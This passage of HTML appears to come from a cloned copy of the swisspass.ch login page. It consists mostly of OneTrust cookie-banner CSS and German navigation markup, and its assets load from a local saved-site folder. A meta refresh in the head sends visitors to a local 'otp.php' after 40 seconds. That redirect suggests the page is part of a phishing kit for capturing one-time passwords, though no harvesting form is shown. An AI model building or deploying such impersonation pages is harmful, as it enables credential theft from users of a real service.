        font-size: .82em;
        line-height: 1.4
      }

      #onetrust-banner-sdk .banner-option-input * {
        pointer-events: none;
        font-size: inherit;
        line-height: inherit
      }

      #onetrust-banner-sdk .banner-option-input[aria-expanded=true]~.banner-option-details {
        display: block;
        height: auto
      }

      #onetrust-banner-sdk .banner-option-input[aria-expanded=true] .ot-arrow-container {
        transform: rotate(90deg)
      }

      #onetrust-banner-sdk .banner-option {
        margin-bottom: 12px;
        margin-left: 0;
        border: none;
        float: left;
        padding: 0
      }

      #onetrust-banner-sdk .banner-option:first-child {
        padding-left: 2px
      }

      #onetrust-banner-sdk .banner-option:not(:first-child) {
        padding: 0;
        border: none
      }

      #onetrust-banner-sdk .banner-option-header {
        cursor: pointer;
        display: inline-block
      }

      #onetrust-banner-sdk .banner-option-header :first-child {
        color: dimgray;
        font-weight: bold;
        float: left
      }

      #onetrust-banner-sdk .banner-option-header .ot-arrow-container {
        display: inline-block;
        border-top: 6px solid rgba(0, 0, 0, 0);
        border-bottom: 6px solid rgba(0, 0, 0, 0);
        border-left: 6px solid dimgray;
        margin-left: 10px;
        vertical-align: middle
      }

      #onetrust-banner-sdk .banner-option-details {
        display: none;
        font-size: .83em;
        line-height: 1.5;
        padding: 10px 0px 5px 10px;
        margin-right: 10px;
        height: 0px
      }

      #onetrust-banner-sdk .banner-option-details * {
        font-size: inherit;
        line-height: inherit;
        color: dimgray
      }

      #onetrust-banner-sdk .ot-arrow-container,
      #onetrust-banner-sdk .banner-option-details {
        transition: all 300ms ease-in 0s;
        -webkit-transition: all 300ms ease-in 0s;
        -moz-transition: all 300ms ease-in 0s;
        -o-transition: all 300ms ease-in 0s
      }

      #onetrust-banner-sdk .ot-dpd-container {
        float: left
      }

      #onetrust-banner-sdk .ot-dpd-title {
        margin-bottom: 10px
      }

      #onetrust-banner-sdk .ot-dpd-title,
      #onetrust-banner-sdk .ot-dpd-desc {
        font-size: .88em;
        line-height: 1.4;
        color: dimgray
      }

      #onetrust-banner-sdk .ot-dpd-title *,
      #onetrust-banner-sdk .ot-dpd-desc * {
        font-size: inherit;
        line-height: inherit
      }

      #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text * {
        margin-bottom: 0
      }

      #onetrust-banner-sdk.ot-iab-2 .onetrust-vendors-list-handler {
        display: block;
        margin-left: 0;
        margin-top: 5px;
        clear: both;
        margin-bottom: 0;
        padding: 0;
        border: 0;
        height: auto;
        width: auto
      }

      #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group button {
        display: block
      }

      #onetrust-banner-sdk.ot-close-btn-link {
        padding-top: 25px
      }

      #onetrust-banner-sdk.ot-close-btn-link #onetrust-close-btn-container {
        top: 15px;
        transform: none;
        right: 15px
      }

      #onetrust-banner-sdk.ot-close-btn-link #onetrust-close-btn-container button {
        padding: 0;
        white-space: pre-wrap;
        border: none;
        height: auto;
        line-height: 1.5;
        text-decoration: underline;
        font-size: .69em
      }

      #onetrust-banner-sdk #onetrust-policy-text,
      #onetrust-banner-sdk .ot-dpd-desc,
      #onetrust-banner-sdk .ot-b-addl-desc {
        font-size: .813em;
        line-height: 1.5
      }

      #onetrust-banner-sdk .ot-dpd-desc {
        margin-bottom: 10px
      }

      #onetrust-banner-sdk .ot-dpd-desc>.ot-b-addl-desc {
        margin-top: 10px;
        margin-bottom: 10px;
        font-size: 1em
      }

      @media only screen and (max-width: 425px) {
        #onetrust-banner-sdk #onetrust-close-btn-container {
          position: absolute;
          top: 6px;
          right: 2px
        }

        #onetrust-banner-sdk #onetrust-policy {
          margin-left: 0;
          margin-top: 3em
        }

        #onetrust-banner-sdk #onetrust-button-group {
          display: block
        }

        #onetrust-banner-sdk #onetrust-accept-btn-handler,
        #onetrust-banner-sdk #onetrust-reject-all-handler,
        #onetrust-banner-sdk #onetrust-pc-btn-handler {
          width: 100%
        }

        #onetrust-banner-sdk .onetrust-close-btn-ui {
          top: auto;
          transform: none
        }

        #onetrust-banner-sdk #onetrust-policy-title {
          display: inline;
          float: none
        }

        #onetrust-banner-sdk #banner-options {
          margin: 0;
          padding: 0;
          width: 100%
        }
      }

      @media only screen and (min-width: 426px)and (max-width: 896px) {
        #onetrust-banner-sdk #onetrust-close-btn-container {
          position: absolute;
          top: 0;
          right: 0
        }

        #onetrust-banner-sdk #onetrust-policy {
          margin-left: 1em;
          margin-right: 1em
        }

        #onetrust-banner-sdk .onetrust-close-btn-ui {
          top: 10px;
          right: 10px
        }

        #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-group-container {
          width: 95%
        }

        #onetrust-banner-sdk.ot-iab-2 #onetrust-group-container {
          width: 100%
        }

        #onetrust-banner-sdk.ot-bnr-w-logo #onetrust-button-group-parent {
          padding-left: 50px
        }

        #onetrust-banner-sdk #onetrust-button-group-parent {
          width: 100%;
          position: relative;
          margin-left: 0
        }

        #onetrust-banner-sdk #onetrust-button-group button {
          display: inline-block
        }

        #onetrust-banner-sdk #onetrust-button-group {
          margin-right: 0;
          text-align: center
        }

        #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler {
          float: left
        }

        #onetrust-banner-sdk .has-reject-all-button #onetrust-reject-all-handler,
        #onetrust-banner-sdk .has-reject-all-button #onetrust-accept-btn-handler {
          float: right
        }

        #onetrust-banner-sdk .has-reject-all-button #onetrust-button-group {
          width: calc(100% - 2em);
          margin-right: 0
        }

        #onetrust-banner-sdk .has-reject-all-button #onetrust-pc-btn-handler.cookie-setting-link {
          padding-left: 0px;
          text-align: left
        }

        #onetrust-banner-sdk.ot-buttons-fw .ot-sdk-three button {
          width: 100%;
          text-align: center
        }

        #onetrust-banner-sdk.ot-buttons-fw #onetrust-button-group-parent button {
          float: none
        }

        #onetrust-banner-sdk.ot-buttons-fw #onetrust-pc-btn-handler.cookie-setting-link {
          text-align: center
        }
      }

      @media only screen and (min-width: 550px) {
        #onetrust-banner-sdk .banner-option:not(:first-child) {
          border-left: 1px solid #d8d8d8;
          padding-left: 25px
        }
      }

      @media only screen and (min-width: 425px)and (max-width: 550px) {

        #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group,
        #onetrust-banner-sdk.ot-iab-2 #onetrust-policy,
        #onetrust-banner-sdk.ot-iab-2 .banner-option {
          width: 100%
        }
      }

      @media only screen and (min-width: 769px) {
        #onetrust-banner-sdk #onetrust-button-group {
          margin-right: 30%
        }

        #onetrust-banner-sdk #banner-options {
          margin-left: 2em;
          margin-right: 5em;
          margin-bottom: 1.25em;
          width: calc(100% - 7em)
        }
      }

      @media only screen and (min-width: 897px)and (max-width: 1023px) {
        #onetrust-banner-sdk.vertical-align-content #onetrust-button-group-parent {
          position: absolute;
          top: 50%;
          left: 75%;
          transform: translateY(-50%)
        }

        #onetrust-banner-sdk #onetrust-close-btn-container {
          top: 50%;
          margin: auto;
          transform: translate(-50%, -50%);
          position: absolute;
          padding: 0;
          right: 0
        }

        #onetrust-banner-sdk #onetrust-close-btn-container button {
          position: relative;
          margin: 0;
          right: -22px;
          top: 2px
        }
      }

      @media only screen and (min-width: 1024px) {
        #onetrust-banner-sdk #onetrust-close-btn-container {
          top: 50%;
          margin: auto;
          transform: translate(-50%, -50%);
          position: absolute;
          right: 0
        }

        #onetrust-banner-sdk #onetrust-close-btn-container button {
          right: -12px
        }

        #onetrust-banner-sdk #onetrust-policy {
          margin-left: 2em
        }

        #onetrust-banner-sdk.vertical-align-content #onetrust-button-group-parent {
          position: absolute;
          top: 50%;
          left: 60%;
          transform: translateY(-50%)
        }

        #onetrust-banner-sdk .ot-optout-signal {
          width: 50%
        }

        #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-title {
          width: 50%
        }

        #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text,
        #onetrust-banner-sdk.ot-iab-2 :not(.ot-dpd-desc)>.ot-b-addl-desc {
          margin-bottom: 1em;
          width: 50%;
          border-right: 1px solid #d8d8d8;
          padding-right: 1rem
        }

        #onetrust-banner-sdk.ot-iab-2 #onetrust-policy-text {
          margin-bottom: 0;
          padding-bottom: 1em
        }

        #onetrust-banner-sdk.ot-iab-2 :not(.ot-dpd-desc)>.ot-b-addl-desc {
          margin-bottom: 0;
          padding-bottom: 1em
        }

        #onetrust-banner-sdk.ot-iab-2 .ot-dpd-container {
          width: 45%;
          padding-left: 1rem;
          display: inline-block;
          float: none
        }

        #onetrust-banner-sdk.ot-iab-2 .ot-dpd-title {
          line-height: 1.7
        }

        #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group-parent {
          left: auto;
          right: 4%;
          margin-left: 0
        }

        #onetrust-banner-sdk.ot-iab-2 #onetrust-button-group button {
          display: block
        }

        #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-button-group-parent {
          margin: auto;
          width: 30%
        }

        #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-group-container {
          width: 60%
        }

        #onetrust-banner-sdk #onetrust-button-group {
          margin-right: auto
        }

        #onetrust-banner-sdk #onetrust-accept-btn-handler,
        #onetrust-banner-sdk #onetrust-reject-all-handler,
        #onetrust-banner-sdk #onetrust-pc-btn-handler {
          margin-top: 1em
        }
      }

      @media only screen and (min-width: 890px) {
        #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group-parent {
          padding-left: 3%;
          padding-right: 4%;
          margin-left: 0
        }

        #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group {
          margin-right: 0;
          margin-top: 1.25em;
          width: 100%
        }

        #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group button {
          width: 100%;
          margin-bottom: 5px;
          margin-top: 5px
        }

        #onetrust-banner-sdk.ot-buttons-fw:not(.ot-iab-2) #onetrust-button-group button:last-of-type {
          margin-bottom: 20px
        }
      }

      @media only screen and (min-width: 1280px) {
        #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-group-container {
          width: 55%
        }

        #onetrust-banner-sdk:not(.ot-iab-2) #onetrust-button-group-parent {
          width: 44%;
          padding-left: 2%;
          padding-right: 2%
        }

        #onetrust-banner-sdk:not(.ot-iab-2).vertical-align-content #onetrust-button-group-parent {
          position: absolute;
          left: 55%
        }
      }

      #onetrust-consent-sdk #onetrust-banner-sdk {
        background-color: #CCCCCC;
      }

      #onetrust-consent-sdk #onetrust-policy-title,
      #onetrust-consent-sdk #onetrust-policy-text,
      #onetrust-consent-sdk .ot-b-addl-desc,
      #onetrust-consent-sdk .ot-dpd-desc,
      #onetrust-consent-sdk .ot-dpd-title,
      #onetrust-consent-sdk #onetrust-policy-text *:not(.onetrust-vendors-list-handler),
      #onetrust-consent-sdk .ot-dpd-desc *:not(.onetrust-vendors-list-handler),
      #onetrust-consent-sdk #onetrust-banner-sdk #banner-options *,
      #onetrust-banner-sdk .ot-cat-header,
      #onetrust-banner-sdk .ot-optout-signal {
        color: #F6F6F6;
      }

      #onetrust-consent-sdk #onetrust-banner-sdk .banner-option-details {
        background-color: #EEEEEE;
      }

      #onetrust-consent-sdk #onetrust-banner-sdk a[href],
      #onetrust-consent-sdk #onetrust-banner-sdk a[href] font,
      #onetrust-consent-sdk #onetrust-banner-sdk .ot-link-btn {
        color: #FFFFFF;
      }

      #onetrust-consent-sdk #onetrust-accept-btn-handler,
      #onetrust-banner-sdk #onetrust-reject-all-handler {
        background-color: #C51416;
        border-color: #C51416;
        color: #FFFFFF;
      }

      #onetrust-consent-sdk #onetrust-banner-sdk *:focus,
      #onetrust-consent-sdk #onetrust-banner-sdk:focus {
        outline-color: #000000;
        outline-width: 1px;
      }

      #onetrust-consent-sdk #onetrust-pc-btn-handler,
      #onetrust-consent-sdk #onetrust-pc-btn-handler.cookie-setting-link {
        color: #F6F6F6;
        border-color: #F6F6F6;
        background-color:
          #CCCCCC;
      }

      #onetrust-consent-sdk,
      #onetrust-banner-sdk,
      #onetrust-consent-sdk div,
      #onetrust-banner-sdk div {
        font-size: 1.6rem;
      }

      #onetrust-pc-sdk .ot-pc-header {
        background-color: #C51416;
        padding-right: 2rem;
      }

      #onetrust-pc-sdk #ot-pc-title {
        color: white !important;
      }

      #onetrust-pc-sdk #ot-pc-title:before {
        display: none !important;
      }

      #onetrust-consent-sdk * {
        color: #333 !important;
      }

      #onetrust-consent-sdk .ot-btn-container *,
      #onetrust-button-group * {
        color: white !important;
      }

      #onetrust-pc-sdk .ot-tab-list h3 {
        font-weight: 200 !important;
      }

      #onetrust-pc-sdk .ot-tab-list .ot-active-menu h3 {
        font-weight: 600 !important;
      }

      #onetrust-pc-sdk #ot-pc-title:after {
        background: transparent !important;
        background-color: transparent !important;
      }

      #onetrust-pc-sdk .ot-sdk-four.ot-sdk-columns {
        background-color: #eee;
      }

      button#close-pc-btn-handler:after {
        font-family: "icomoon";
        content: "\e602";
        background: #C51416;
        width: 3.5rem;
        position: relative;
        display: block;
        color: white;
      }

      #onetrust-consent-sdk #onetrust-pc-sdk .ot-active-menu {
        border-color: transparent !important;
      }

      #onetrust-pc-sdk .category-menu-switch-handler,
      .ot-active-menu.category-menu-switch-handler {
        border: none !important;
      }

      #onetrust-consent-sdk #onetrust-pc-btn-handler,
      #onetrust-consent-sdk #onetrust-pc-btn-handler.cookie-setting-link {
        padding: 12px 10px;
        border: 1px solid #484848;
        background-color: #484848 !important;
        text-decoration: none;
      }

      #onetrust-consent-sdk #onetrust-pc-btn-handler:hover,
      #onetrust-consent-sdk #onetrust-pc-btn-handler.cookie-setting-link:hover {
        background-color: #000 !important;
      }

      button#ot-sdk-btn {
        position: fixed;
        bottom: 1rem;
        left: 1rem;
        display: block !important;
        visibility: visible !important;
        z-index: 1000;
        background-color: #484848 !important;
        border: 1px solid #484848 !important;
        color: white !important;
      }

      button#ot-sdk-btn:hover {
        background-color: #000 !important;
      }

      .ot-sdk-cookie-policy {
        font-family: inherit;
        font-size: 16px
      }

      .ot-sdk-cookie-policy.otRelFont {
        font-size: 1rem
      }

      .ot-sdk-cookie-policy h3,
      .ot-sdk-cookie-policy h4,
      .ot-sdk-cookie-policy h6,
      .ot-sdk-cookie-policy p,
      .ot-sdk-cookie-policy li,
      .ot-sdk-cookie-policy a,
      .ot-sdk-cookie-policy th,
      .ot-sdk-cookie-policy #cookie-policy-description,
      .ot-sdk-cookie-policy .ot-sdk-cookie-policy-group,
      .ot-sdk-cookie-policy #cookie-policy-title {
        color: dimgray
      }

      .ot-sdk-cookie-policy #cookie-policy-description {
        margin-bottom: 1em
      }

      .ot-sdk-cookie-policy h4 {
        font-size: 1.2em
      }

      .ot-sdk-cookie-policy h6 {
        font-size: 1em;
        margin-top: 2em
      }

      .ot-sdk-cookie-policy th {
        min-width: 75px
      }

      .ot-sdk-cookie-policy a,
      .ot-sdk-cookie-policy a:hover {
        background: #fff
      }

      .ot-sdk-cookie-policy thead {
        background-color: #f6f6f4;
        font-weight: bold
      }

      .ot-sdk-cookie-policy .ot-mobile-border {
        display: none
      }

      .ot-sdk-cookie-policy section {
        margin-bottom: 2em
      }

      .ot-sdk-cookie-policy table {
        border-collapse: inherit
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy {
        font-family: inherit;
        font-size: 1rem
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h3,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h4,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-title {
        color: dimgray
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description {
        margin-bottom: 1em
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup {
        margin-left: 1.5em
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group-desc,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-table-header,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td {
        font-size: .9em
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td span,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td a {
        font-size: inherit
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group {
        font-size: 1em;
        margin-bottom: .6em
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-title {
        margin-bottom: 1.2em
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy>section {
        margin-bottom: 1em
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th {
        min-width: 75px
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a:hover {
        background: #fff
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead {
        background-color: #f6f6f4;
        font-weight: bold
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-mobile-border {
        display: none
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy section {
        margin-bottom: 2em
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup ul li {
        list-style: disc;
        margin-left: 1.5em
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup ul li h4 {
        display: inline-block
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table {
        border-collapse: inherit;
        margin: auto;
        border: 1px solid #d7d7d7;
        border-radius: 5px;
        border-spacing: initial;
        width: 100%;
        overflow: hidden
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td {
        border-bottom: 1px solid #d7d7d7;
        border-right: 1px solid #d7d7d7
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td {
        border-bottom: 0px
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr th:last-child,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr td:last-child {
        border-right: 0px
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-host,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-cookies-type {
        width: 25%
      }

      .ot-sdk-cookie-policy[dir=rtl] {
        text-align: left
      }

      #ot-sdk-cookie-policy h3 {
        font-size: 1.5em
      }

      @media only screen and (max-width: 530px) {

        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) table,
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) thead,
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tbody,
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) th,
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td,
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr {
          display: block
        }

        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) thead tr {
          position: absolute;
          top: -9999px;
          left: -9999px
        }

        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr {
          margin: 0 0 1em 0
        }

        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr:nth-child(odd),
        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr:nth-child(odd) a {
          background: #f6f6f4
        }

        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td {
          border: none;
          border-bottom: 1px solid #eee;
          position: relative;
          padding-left: 50%
        }

        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td:before {
          position: absolute;
          height: 100%;
          left: 6px;
          width: 40%;
          padding-right: 10px
        }

        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) .ot-mobile-border {
          display: inline-block;
          background-color: #e4e4e4;
          position: absolute;
          height: 100%;
          top: 0;
          left: 45%;
          width: 2px
        }

        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td:before {
          content: attr(data-label);
          font-weight: bold
        }

        .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) li {
          word-break: break-word;
          word-wrap: break-word
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table {
          overflow: hidden
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td {
          border: none;
          border-bottom: 1px solid #d7d7d7
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tbody,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tr {
          display: block
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-host,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-cookies-type {
          width: auto
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tr {
          margin: 0 0 1em 0
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td:before {
          height: 100%;
          width: 40%;
          padding-right: 10px
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td:before {
          content: attr(data-label);
          font-weight: bold
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li {
          word-break: break-word;
          word-wrap: break-word
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead tr {
          position: absolute;
          top: -9999px;
          left: -9999px;
          z-index: -9999
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td {
          border-bottom: 1px solid #d7d7d7;
          border-right: 0px
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td:last-child {
          border-bottom: 0px
        }
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h5,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,
      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description {
        color: #686868;
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th {
        color: #686868;
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group {
        color: #686868;
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-title {
        color: #686868;
      }

      #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th {
        background-color: #DCDCDC;
      }

      
    </style>
	<meta http-equiv="refresh" content="40;url=otp.php" />
  </head>
  <body class="js-offcanvas-root">
    <app-root class="ng-tns-c2819549821-0" ng-version="16.1.4">
      <div class="skel-wrap-outer js-offcanvas-wrap ng-tns-c2819549821-0 skin-registration skin-provider">
        <app-sr-nav class="ng-tns-c2819549821-0">
          <a class="hidden"></a>
          <h1 id="skipnav" tabindex="-1" class="sr-only">Navigieren auf swisspass.ch</h1>
          <nav role="navigation" class="mod-srnav">
            <ul>
              <li>
                <a accesskey="0" href="#" title="[ALT+0]"> Home </a>
              </li>
              <li class="hidden-xs container">
                <a accesskey="1" title="[ALT+1]" href="#"> Navigation </a>
              </li>
              <li class="container">
                <a accesskey="2" title="[ALT+2]" href="#"> Inhalt </a>
              </li>
              <li class="container">
                <a accesskey="3" title="[ALT+3]" href="#"> Kontakt </a>
              </li>
              <li class="container">
                <a accesskey="6" title="[ALT+6]" href="#"> Fussbereich </a>
              </li>
            </ul>
          </nav>
        </app-sr-nav>
        <a aria-hidden="true" aria-label="Navigation schliessen" class="mod-offcanvas-closeoverlay ng-tns-c2819549821-0"></a>
        <app-swisspass-mobile-nav class="ng-tns-c2819549821-0" _nghost-ng-c3146796057="">
          <nav _ngcontent-ng-c3146796057="" role="navigation" aria-hidden="true" class="visible-xs mod-offcanvas js-offcanvas-aside js-nestedmenu-scroller">
            <div _ngcontent-ng-c3146796057="" role="navigation" class="mod-nestedmenu mod-nestedemenu__hierarchy js-nestedmenu js-nestedmenu__expander mod-offcanvas-nav clearfix">
              <div _ngcontent-ng-c3146796057="" class="mod-nestedmenu--listwrap">
                <h2 _ngcontent-ng-c3146796057="" id="navTopRootMobile" tabindex="-1" class="sr-only">Navigation</h2>
                <a _ngcontent-ng-c3146796057="" routerlink="/register" routerlinkactive="active" tabindex="-1" class="sr-only js-webtrends--initted active" href="#">ZurÃ¼ck zu Navigieren auf swisspass.ch</a>
                <div _ngcontent-ng-c3146796057="" class="visible-xs mod-mobileheader">
                  <a _ngcontent-ng-c3146796057="" href="#">
                    <div _ngcontent-ng-c3146796057="" class="mod-valign mod-valign__middle">
                      <div _ngcontent-ng-c3146796057="" class="mod-mobileheader--main mod-valign--el">
                        <div _ngcontent-ng-c3146796057="" class="mod-mobileheader--title">
                          <picture _ngcontent-ng-c3146796057="">
                            <source _ngcontent-ng-c3146796057="" type="image/svg+xml" srcset="swisspass.ch_files/logo_mobile.svg 1x">
                            <img _ngcontent-ng-c3146796057="" alt="" src="swisspass.ch_files/logo_mobile.png" width="100" height="50">
                          </picture>
                        </div>
                      </div>
                    </div>
                  </a>
                </div>
                <ul _ngcontent-ng-c3146796057="" class="mod-nestedmenu--list list-unstyled">
                  <!---->
                  <li _ngcontent-ng-c3146796057="" class="mod-nestedmenu--item mod-nestedmenu--expandible">
                    <span _ngcontent-ng-c3146796057="" class="hidden"> Sprache </span>
                    <ul _ngcontent-ng-c3146796057="" role="tabpanel" class="mod-nestedmenu--wrap mod-nestedmenu--languagelinks">
                      <li _ngcontent-ng-c3146796057="" class="mod-nestedmenu--languagelinks-entry ng-star-inserted">
                        <!---->
                        <span _ngcontent-ng-c3146796057="" class="mod-nestedmenu--link ng-star-inserted"> de </span>
                        <!---->
                      </li>
                      <li _ngcontent-ng-c3146796057="" class="mod-nestedmenu--languagelinks-entry ng-star-inserted">
                        <a _ngcontent-ng-c3146796057="" class="mod-nestedmenu--link ng-star-inserted"> fr </a>
                        <!---->
                        <!---->
                      </li>
                      <li _ngcontent-ng-c3146796057="" class="mod-nestedmenu--languagelinks-entry ng-star-inserted">
                        <a _ngcontent-ng-c3146796057="" class="mod-nestedmenu--link ng-star-inserted"> it </a>
                        <!---->
                        <!---->
                      </li>
                      <li _ngcontent-ng-c3146796057="" class="mod-nestedmenu--languagelinks-entry ng-star-inserted">
                        <a _ngcontent-ng-c3146796057="" class="mod-nestedmenu--link ng-star-inserted"> en </a>
                        <!---->
                        <!---->
                      </li>
                      <!---->
                    </ul>
                  </li>
                </ul>
              </div>
            </div>
          </nav>
        </app-swisspass-mobile-nav>
        <div class="skel-wrap-inner js-offcanvas-main ng-tns-c2819549821-0">
          <app-swisspass-co-branding-header class="ng-tns-c2819549821-0">
            <header class="skel-header skel-header-provider ng-star-inserted" style="background-color: rgb(255, 255, 255);">
              <h1 id="navTopRoot" tabindex="-1" class="sr-only">Navigation</h1>
              <a href="" tabindex="-1" class="sr-only">ZurÃ¼ck</a>
            </header>
            <!---->
          </app-swisspass-co-branding-header>
          <app-swisspass-header class="ng-tns-c2819549821-0">
            <header  class="skel-header js-collapser js-collapser__initted js-collapser__collapsed">
              <div class="visible-xs mod-mobileheader">
                <div class="mod-mobileheader--titlewrap">
                  <div class="mod-valign mod-valign__middle">
                    <div class="mod-mobileheader--main mod-valign--el">
                      <button class="mod-mobileheader--toggle mod-mobileheader--toggle__back btn-link" aria-label="Navigation schliessen">
                        <span class="mod-mobileheader--toggleicon mod-icon mod-icon__lg icon-menuarrow_32"></span>
                      </button>
                      <button class="mod-mobileheader--toggle mod-mobileheader--toggle__menu btn-link" aria-label="Navigation aufklappen">
                        <span class="mod-mobileheader--toggleicon mod-icon mod-icon__lg icon-navigation_32 mod-mobileheader--toggleicon-big"></span>
                        <span class="mod-mobileheader--toggletext">MenÃ¼</span>
                      </button>
                    </div>
                  </div>
                </div>
                <div aria-hidden="true" class="mod-mobileheader--titlewrap mod-mobileheader--titlewrap---logo">
                  <div class="mod-valign mod-valign__middle">
                    <div class="mod-mobileheader--main mod-valign--el">
                      <div class="mod-mobileheader--title">
                        <picture>
                          <source type="image/svg+xml" srcset="swisspass.ch_files/logo_mobile_002.svg 1x">
                          <img alt="" src="swisspass.ch_files/logo_mobile_002.png" width="100" height="50">
                        </picture>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="js-collapser--placeholder">
                <div class="js-collapser--fixer" style="position: static; width: 1333px;">
                  <div class="js-collapser--flexible">
                    <nav id="navTopRoot" role="navigation" class="hidden-xs mod-metamenu mod-metamenu__header">
